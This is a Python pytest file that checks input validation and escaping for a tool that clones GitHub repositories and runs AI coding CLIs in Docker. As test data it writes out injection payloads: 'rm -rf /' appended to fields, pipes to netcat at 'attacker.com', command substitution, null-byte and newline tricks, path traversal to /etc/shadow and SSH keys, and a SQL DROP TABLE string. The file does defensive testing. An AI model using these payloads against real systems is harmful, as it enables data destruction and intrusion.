"""Security tests for command injection prevention."""

import pytest
from utils.validators import TaskInputValidator, GitHubIntegrationValidator
from utils.secure_exec import (
    safe_git_clone, safe_git_config, safe_git_commit,
    safe_git_command, create_safe_docker_script
)


class TestInputValidation:
    """Test input validation to prevent command injection."""
    
    def test_valid_task_inputs(self):
        """Test that valid inputs pass validation."""
        valid_input = TaskInputValidator(
            task_id="550e8400-e29b-41d4-a716-446655440000",
            repo_url="https://github.com/user/repo.git",
            target_branch="main",
            prompt="Fix the bug in authentication",
            model="claude",
            github_username="testuser"
        )
        assert valid_input.repo_url == "https://github.com/user/repo.git"
        assert valid_input.target_branch == "main"
        assert valid_input.model == "claude"
    
    def test_invalid_repo_url_format(self):
        """Test that invalid repo URLs are rejected."""
        invalid_urls = [
            "http://github.com/user/repo.git",  # Not HTTPS
            "https://gitlab.com/user/repo.git",  # Not GitHub
            "https://github.com/user/repo",      # Missing .git
            "https://github.com/../etc/passwd",  # Path traversal
            "https://github.com/user/repo.git; rm -rf /",  # Command injection
            "https://github.com/user/repo.git && malicious_command",
            "https://github.com/user/repo.git | nc attacker.com 1234",
        ]
        
        for url in invalid_urls:
            with pytest.raises(ValueError):
                TaskInputValidator(
                    task_id="550e8400-e29b-41d4-a716-446655440000",
                    repo_url=url,
                    target_branch="main",
                    prompt="Test",
                    model="claude"
                )
    
    def test_invalid_branch_names(self):
        """Test that dangerous branch names are rejected."""
        invalid_branches = [
            "main; rm -rf /",           # Command injection
            "main && evil_command",     # Command chaining
            "main | nc attacker 1234",  # Pipe to netcat
            "../../../etc/passwd",      # Path traversal
            "~/.ssh/id_rsa",           # Home directory access
            "/etc/shadow",             # Absolute path
            "main`whoami`",            # Command substitution
            "main$(id)",               # Command substitution
            "main${IFS}&&${IFS}id",    # IFS exploitation
            "main\nid\n",              # Newline injection
            "main\x00id",              # Null byte injection
        ]
        
        for branch in invalid_branches:
            with pytest.raises(ValueError):
                TaskInputValidator(
                    task_id="550e8400-e29b-41d4-a716-446655440000",
                    repo_url="https://github.com/user/repo.git",
                    target_branch=branch,
                    prompt="Test",
                    model="claude"
                )
    
    def test_prompt_length_limit(self):
        """Test that prompts are limited in length."""
        long_prompt = "A" * 10001  # Over the 10000 char limit
        
        with pytest.raises(ValueError, match="Prompt too long"):
            TaskInputValidator(
                task_id="550e8400-e29b-41d4-a716-446655440000",
                repo_url="https://github.com/user/repo.git",
                target_branch="main",
                prompt=long_prompt,
                model="claude"
            )
    
    def test_invalid_model_selection(self):
        """Test that only valid models are accepted."""
        invalid_models = [
            "gpt-4",
            "llama",
            "claude; rm -rf /",
            "codex && malicious_command",
            "../../../bin/sh"
        ]
        
        for model in invalid_models:
            with pytest.raises(ValueError, match="Invalid model"):
                TaskInputValidator(
                    task_id="550e8400-e29b-41d4-a716-446655440000",
                    repo_url="https://github.com/user/repo.git",
                    target_branch="main",
                    prompt="Test",
                    model=model
                )
    
    def test_task_id_validation(self):
        """Test that task IDs must be valid UUIDs."""
        invalid_ids = [
            "not-a-uuid",
            "550e8400-e29b-41d4-a716-446655440000; rm -rf /",
            "../../../etc/passwd",
            "'; DROP TABLE tasks;--",
        ]
        
        for task_id in invalid_ids:
            with pytest.raises(ValueError, match="Invalid task ID"):
                TaskInputValidator(
                    task_id=task_id,
                    repo_url="https://github.com/user/repo.git",
                    target_branch="main",
                    prompt="Test",
                    model="claude"
                )
    
    def test_github_username_validation(self):
        """Test GitHub username validation."""
        invalid_usernames = [
            "user; rm -rf /",
            "user && evil",
            "../../../root",
            "user@attacker.com",
            "user|nc attacker 1234",
        ]
        
        for username in invalid_usernames:
            with pytest.raises(ValueError, match="Invalid GitHub username"):
                TaskInputValidator(
                    task_id="550e8400-e29b-41d4-a716-446655440000",
                    repo_url="https://github.com/user/repo.git",
                    target_branch="main",
                    prompt="Test",
                    model="claude",
                    github_username=username
                )


class TestGitHubIntegrationValidation:
    """Test GitHub integration input validation."""
    
    def test_valid_pr_inputs(self):
        """Test valid PR creation inputs."""
        valid_input = GitHubIntegrationValidator(
            task_id="550e8400-e29b-41d4-a716-446655440000",
            base_branch="main",
            pr_title="Fix authentication bug",
            pr_body="This PR fixes the authentication issue in login flow."
        )
        assert valid_input.base_branch == "main"
        assert "Fix authentication bug" in valid_input.pr_title
    
    def test_pr_title_sanitization(self):
        """Test that PR titles are sanitized."""
        malicious_title = "Fix bug; rm -rf / && echo 'pwned'"
        validated = GitHubIntegrationValidator(
            task_id="550e8400-e29b-41d4-a716-446655440000",
            base_branch="main",
            pr_title=malicious_title,
            pr_body="Test body"
        )
        # Special characters should be removed
        assert "rm -rf" not in validated.pr_title
        assert ";" not in validated.pr_title
        assert "&" not in validated.pr_title
    
    def test_pr_body_length_limit(self):
        """Test PR body length limit."""
        long_body = "A" * 5001  # Over 5000 char limit
        validated = GitHubIntegrationValidator(
            task_id="550e8400-e29b-41d4-a716-446655440000",
            base_branch="main",
            pr_title="Test",
            pr_body=long_body
        )
        assert len(validated.pr_body) == 5000


class TestSecureExecution:
    """Test secure command execution utilities."""
    
    def test_safe_git_clone_escaping(self):
        """Test that git clone properly escapes arguments."""
        # This test would need to mock subprocess.run
        # to verify the command is constructed safely
        pass
    
    def test_create_safe_docker_script(self):
        """Test Docker script creation with proper escaping."""
        script = create_safe_docker_script(
            repo_url="https://github.com/user/repo.git",
            branch="main",
            prompt="Fix bug; rm -rf /",  # Malicious prompt
            model_cli="claude",
            github_username="testuser"
        )
        
        # Verify the script doesn't contain unescaped user input
        assert "rm -rf /" not in script
        assert "Fix bug; rm -rf /" not in script
        
        # Verify proper quoting is used
        assert "shlex.quote" in create_safe_docker_script.__code__.co_names or "'" in script
    
    def test_safe_git_command_timeout(self):
        """Test that git commands have timeouts."""
        # This would test that commands timeout after specified duration
        pass
    
    def test_special_characters_in_prompts(self):
        """Test handling of special characters in prompts."""
        special_prompts = [
            "Fix $PATH issue",
            "Handle `backticks` properly",
            'Use "double quotes" correctly',
            "Escape \\backslashes\\ properly",
            "Handle\nnewlines\nproperly",
            "Deal with 'single quotes'",
        ]
        
        for prompt in special_prompts:
            script = create_safe_docker_script(
                repo_url="https://github.com/user/repo.git",
                branch="main",
                prompt=prompt,
                model_cli="claude"
            )
            # Script should be valid bash
            assert "#!/bin/bash" in script


class TestCommandInjectionPrevention:
    """Integration tests for command injection prevention."""
    
    def test_malicious_branch_names_blocked(self):
        """Test that malicious branch names can't execute commands."""
        malicious_branches = [
            {"branch": "main; cat /etc/passwd", "expected_block": True},
            {"branch": "feature/test && id", "expected_block": True},
            {"branch": "dev | whoami", "expected_block": True},
            {"branch": "test`uname -a`", "expected_block": True},
            {"branch": "prod$(hostname)", "expected_block": True},
        ]
        
        for test_case in malicious_branches:
            with pytest.raises(ValueError):
                TaskInputValidator(
                    task_id="550e8400-e29b-41d4-a716-446655440000",
                    repo_url="https://github.com/user/repo.git",
                    target_branch=test_case["branch"],
                    prompt="Test",
                    model="claude"
                )
    
    def test_path_traversal_prevention(self):
        """Test that path traversal attempts are blocked."""
        traversal_attempts = [
            "../../../etc/passwd",
            "..\\..\\..\\windows\\system32",
            "~/../../root",
            "/etc/shadow",
            "C:\\Windows\\System32\\config\\SAM",
        ]
        
        for path in traversal_attempts:
            with pytest.raises(ValueError):
                TaskInputValidator(
                    task_id="550e8400-e29b-41d4-a716-446655440000",
                    repo_url=f"https://github.com/{path}/repo.git",
                    target_branch="main",
                    prompt="Test",
                    model="claude"
                )
    
    def test_null_byte_injection_prevention(self):
        """Test that null bytes are handled safely."""
        null_byte_inputs = [
            "main\x00rm -rf /",
            "test\x00\x00malicious",
            "branch\x00&&id",
        ]
        
        for branch in null_byte_inputs:
            with pytest.raises(ValueError):
                TaskInputValidator(
                    task_id="550e8400-e29b-41d4-a716-446655440000",
                    repo_url="https://github.com/user/repo.git",
                    target_branch=branch,
                    prompt="Test",
                    model="claude"
                )


if __name__ == "__main__":
    pytest.main([__file__, "-v"])